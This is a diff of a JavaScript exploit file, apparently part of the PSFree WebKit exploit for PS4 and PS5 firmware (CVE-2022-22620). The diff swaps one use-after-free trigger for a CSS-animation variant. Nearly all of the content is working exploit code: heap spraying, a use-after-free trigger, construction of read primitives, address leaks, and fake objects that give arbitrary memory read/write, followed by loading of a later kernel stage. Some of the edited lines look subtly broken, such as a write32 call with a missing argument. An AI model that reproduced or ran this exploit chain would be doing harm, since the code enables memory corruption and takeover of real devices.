@@ -13,12 +13,7 @@ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU Affero General Public License for more details.
 
 You should have received a copy of the GNU Affero General Public License
-along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
-
-// PSFree is a WebKit exploit using CVE-2022-22620 to gain arbitrary read/write
-// vulnerable:
-// * PS4 [6.00, 10.00)
-// * PS5 [1.00, 6.00)
+along with this program. If not, see <https://www.gnu.org/licenses/>.  */
 
 import { Int } from './module/int64.mjs';
 import { Memory } from './module/mem.mjs';
@@ -35,80 +30,8 @@ import {
 } from './module/utils.mjs';
 import * as config from './config.mjs';
 import * as off from './module/offset.mjs';
-import { init, Chain } from './rop/900.mjs';
 
-function gc() {
-    new Uint8Array(4 * 1024 * 1024);
-}
-
-function spray() {
-    const tmp = [];
-    for (let j = 0; j < 1024; j++) {
-        const d = new Date(0xbeef);
-        tmp.push(d);
-    }
-}
-
-let sharedData = null;
-
-async function trigger_uaf() {
-    const num_elems = 1600;
-    let root = new Map();
-    let msg = root;
-    let foo = [];
-    for (let i = 0; i < 100; i++) {
-        foo.push(new Date(0xffff));
-    }
-    for (let i = 0; i < num_elems; i++) {
-        const d = new Date(i);
-        const map = new Map();
-        msg.set(d, [map, foo]);
-        msg = map;
-    }
-    msg = root;
-
-    let data2 = null;
-    let idx = null;
-    let lastData = null;
-    loop1: while (true) {
-        let data = null;
-        const prom = new Promise(resolve => {
-            addEventListener('message', event => {
-                data = event;
-                resolve();
-            }, { once: true });
-        });
-        postMessage(msg, origin);
-        await prom;
-        data = data.data;
-
-        gc();
-        await sleep();
-
-        let tmp_i = null;
-        try {
-            for (let i = 0; i < num_elems; i++) {
-                tmp_i = i;
-                if (data.keys().next().value.getTime() === 0xffff) {
-                    idx = i;
-                    lastData = data;
-                    break loop1;
-                }
-                data = data.values().next().value[0];
-            }
-        } catch {
-            idx = tmp_i;
-            lastData = data;
-            break loop1;
-        }
-    }
-
-    sharedData = lastData;
-    log('[Part 1] Shared data updated: ' + (sharedData ? 'set' : 'null'));
-
-    return { data2: lastData.keys().next().value, idx, lastData };
-}
-
+// Check if we are running on a supported firmware version
 const [is_ps4, version] = (() => {
     const value = config.target;
     const is_ps4 = (value & 0x10000) === 0;
@@ -132,22 +55,22 @@ const ssv_len = (() => {
     if (0x600 <= config.target && config.target < 0x650) {
         return 0x58;
     }
-
     if (config.target >= 0x900) {
         return 0x50;
     }
-
     if (0x650 <= config.target && config.target < 0x900) {
         return 0x48;
     }
 })();
 
 const num_reuses = 0x300;
-const num_strs = 0x200;
-const num_leaks = 0x100;
+const DELAY = 100;
+let attemptCount = 0;
+const fakeStates = []; // Global array to store fake state objects
 
-const original_strlen = ssv_len - off.size_strimpl;
-const original_loc = location.pathname;
+function gc() {
+    new Uint8Array(4 * MB);
+}
 
 function sread64(str, offset) {
     const low = (
@@ -163,6 +86,76 @@ function sread64(str, offset) {
         | str.charCodeAt(offset + 7) << 24
     );
     return new Int(low, high);
+}
+
+function prepare_uaf() {
+    const object = document.createElement('object');
+    object.type = 'image/png';
+    const cite = document.createElement('cite');
+    const dl = document.createElement('dl');
+    dl.hidden = true;
+    object.appendChild(cite);
+    object.appendChild(dl);
+    document.body.appendChild(object);
+    return object;
+}
+
+async function uaf_ssv(object) {
+    const views = [];
+    const status = document.getElementById('status');
+    log(`ssv_len: ${hex(ssv_len)}`);
+
+    attemptCount++;
+    log(`Attempt #${attemptCount}: Initiating CSS Animation UAF...`);
+    status.textContent = `Attempt #${attemptCount} in progress...`;
+
+    // Create fake state object
+    const fakeState = { data: new ArrayBuffer(ssv_len) };
+    fakeStates.push(fakeState);
+
+    object.data = 'x';
+    document.querySelector('cite').style.animationIterationCount = 'infinite';
+
+    await new Promise(resolve => setTimeout(resolve, DELAY));
+
+    const animation = document.querySelector('cite').getAnimations()[0];
+    object.width = '1em';
+    object.codeBase;
+    animation.effect = new KeyframeEffect(document.querySelector('dl'), {});
+    gc();
+
+    for (let i = 0; i < num_reuses; i++) {
+        const view = new Uint8Array(new ArrayBuffer(ssv_len));
+        view[0] = 0x41;
+        views.push(view);
+    }
+
+    log('Checking for UAF memory reuse...');
+    const res = [];
+    for (let i = 0; i < views.length; i++) {
+        const view = views[i];
+        if (view[0] !== 0x41) {
+            log(`view index: ${hex(i)}`);
+            log('found view:');
+            log(view);
+
+            view[0] = 1;
+            view.fill(0, 1);
+
+            if (res.length) {
+                res[1] = [new BufferView(view.buffer), { state: fakeStates[0].data }];
+                break;
+            }
+
+            res[0] = new BufferView(view.buffer);
+            i = num_reuses - 1;
+        }
+    }
+
+    if (res.length !== 2) {
+        die('Failed CSS Animation UAF');
+    }
+    return res;
 }
 
 class Reader {
@@ -201,7 +194,7 @@ class Reader {
 
     restore() {
         this.rstr_view.write64(off.strimpl_m_data, this.m_data);
-        this.rstr_view.write32(off.strimpl_strlen, original_strlen);
+        this.rstr_view.write32(off.strimpl_strlen, ssv_len - off.size_strimpl);
     }
 }
 
@@ -210,12 +203,12 @@ async function make_rdr(view) {
     const strs = [];
     const u32 = new Uint32Array(1);
     const u8 = new Uint8Array(u32.buffer);
-    const marker_offset = original_strlen - 4;
+    const marker_offset = (ssv_len - off.size_strimpl) - 4;
     const pad = 'B'.repeat(marker_offset);
 
     log('start string spray');
     while (true) {
-        for (let i = 0; i < num_strs; i++) {
+        for (let i = 0; i < 0x200; i++) {
             u32[0] = i;
             const str = [pad, String.fromCodePoint(...u8)].join('');
             strs.push(str);
@@ -259,7 +252,7 @@ const strs_offset = ssv_len - 8*2;
 const src_part = (() => {
     let res = 'var f = 0x11223344;\n';
     for (let i = 0; i < cons_len; i += 8) {
-        res += `var a${i} = ${num_leaks + i};\n`;
+        res += `var a${i} = ${0x100 + i};\n`;
     }
     return res;
 })();
@@ -275,7 +268,7 @@ async function leak_code_block(reader, bt_size) {
     const bt_part = `var bt = [${bt}];\nreturn bt;\n`;
     const part = bt_part + src_part;
     const cache = [];
-    for (let i = 0; i < num_leaks; i++) {
+    for (let i = 0; i < 0x100; i++) {
         cache.push(part + `var idx = ${i};\nidx\`foo\`;`);
     }
 
@@ -294,7 +287,7 @@ async function leak_code_block(reader, bt_size) {
     rdr.set_addr(search_addr);
     loop: while (true) {
         const funcs = [];
-        for (let i = 0; i < num_leaks; i++) {
+        for (let i = 0; i < 0x100; i++) {
             const f = Function(cache[i]);
             f();
             funcs.push(f);
@@ -364,7 +357,6 @@ function make_ssv_data(ssv_buf, view, view_p, addr, size) {
 
     const data_len = 9;
     const size_vector = 0x10;
-
     const off_m_data = 8;
     const off_m_abc = 0x18;
     const voff_vec_abc = 0;
@@ -395,9 +387,8 @@ function make_ssv_data(ssv_buf, view, view_p, addr, size) {
     }
 }
 
-async function make_arw(reader, view2, data2) {
+async function make_arw(reader, view2, pop) {
     const rdr = reader;
-
     const fakeobj_off = 0x20;
     const fakebt_base = fakeobj_off + off.size_jsobj;
     const indexingHeader_size = 8;
@@ -416,11 +407,11 @@ async function make_arw(reader, view2, data2) {
     view.fill(0);
     make_ssv_data(view2, view, view_p, bt_addr, bt_size);
 
-    const bt = view2;
+    const bt = new BufferView(pop.state);
     view.set(view_save);
 
     log('ArrayBuffer pointing to JSImmutableButterfly:');
-    for (let i = 0; i < bt.byteLength; i += 8) {
+    for (let i = 0; i < bt.length; i += 8) {
         log(`${bt.read64(i)} | ${hex(i)}`);
     }
 
@@ -432,6 +423,7 @@ async function make_arw(reader, view2, data2) {
 
     bt.write64(fakebt_off - 0x10, val_true);
     bt.write32(fakebt_off - 8, 1);
+    bt.write32(fakebt_off - 8 + 1);
     bt.write32(fakebt_off - 8 + 4, 1);
 
     bt.write64(fakebt_off, 0);
@@ -447,7 +439,7 @@ async function make_arw(reader, view2, data2) {
     log(`fake: [${fake}]`);
 
     const test_val = 3;
-    log(`test setting fake[0] to ${test_val}`);
+    log(`Test setting fake[0] to ${test_val}`);
     fake[0] = test_val;
     if (fake[0] !== test_val) {
         die(`unexpected fake[0]: ${fake[0]}`);
@@ -460,7 +452,7 @@ async function make_arw(reader, view2, data2) {
 
     const worker = new DataView(new ArrayBuffer(1));
     const main_template = new Uint32Array(new ArrayBuffer(off.size_view));
-    const leaker = { addr: null, 0: 0 };
+    const leaker = {addr: null, 0: 0};
 
     const worker_p = addrof(worker);
     const main_p = addrof(main_template);
@@ -496,87 +488,32 @@ async function make_arw(reader, view2, data2) {
         log(`${new Int(main[idx], main[idx + 1])} | ${hex(i)}`);
     }
 
-    const memory = new Memory(
+    new Memory(
         main, worker, leaker,
         leaker_p.add(off.js_inline_prop),
         rdr.read64(leaker_p.add(off.js_butterfly)),
     );
     log('achieved arbitrary r/w');
 
-    await init(Chain);
-
     rdr.restore();
     view.write32(0, -1);
     view2.write32(0, -1);
     make_arw._buffer = bt.buffer;
-
-    clear_log();
-    import('./lapse.mjs');
 }
 
-async function main() {
-    log('[*] Triggering UAF');
-    const { data2, idx, lastData } = await trigger_uaf();
-
-    alert('Stage1 done!, try crash');
-    log('[+] UAF triggered, idx: ' + idx);
-
-    gc();
-    spray();
-    await sleep(100);
-
-    if (!data2) {
-        log('[-] Error: data2 is null');
-        throw new Error('data2 is null');
-    }
-
-    if (typeof data2 !== 'object') {
-        log('[-] Error: data2 is not an object');
-        throw new Error('data2 is not an object');
-    }
-
-    if (!data2.getTime || typeof data2.getTime !== 'function') {
-        log('[-] Error: data2 does not have a valid getTime method');
-        throw new Error('data2 does not have a valid getTime method');
-    }
-
-    if (idx === undefined) {
-        log('[-] Error: idx is undefined');
-        throw new Error('idx is undefined');
-    }
-
-    const view = new BufferView(new ArrayBuffer(ssv_len));
-    view[0] = 0x41;
-
-    let data2_addr = null;
-    let view_addr = null;
-    let fake_obj = null;
-
-    data2.getTime = () => {
-        return fake_obj;
-    };
-    data2.getTime();
-
-    if (view[0] !== 0x41) {
-        view[0] = 1;
-        view.fill(0, 1);
-    } else {
-        die('Failed to overlap UAF object with BufferView');
-    }
-
-    const view2 = new BufferView(new ArrayBuffer(ssv_len));
-    view2[0] = 1;
-    view2.fill(0, 1);
+export async function main() {
+    log('STAGE: UAF CSS Animation');
+    const object = prepare_uaf();
+    const [view, [view2, pop]] = await uaf_ssv(object);
 
     log('STAGE: get string relative read primitive');
     const rdr = await make_rdr(view);
 
+    document.body.removeChild(object);
+
     log('STAGE: achieve arbitrary read/write primitive');
-    await make_arw(rdr, view2, data2);
+    await make_arw(rdr, view2, pop);
 
-    data2_addr = mem.addrof(data2);
-    view_addr = mem.addrof(view);
-    fake_obj = mem.fakeobj(view_addr);
+    clear_log();
+    import('./lapse.mjs');
 }
-
-main();
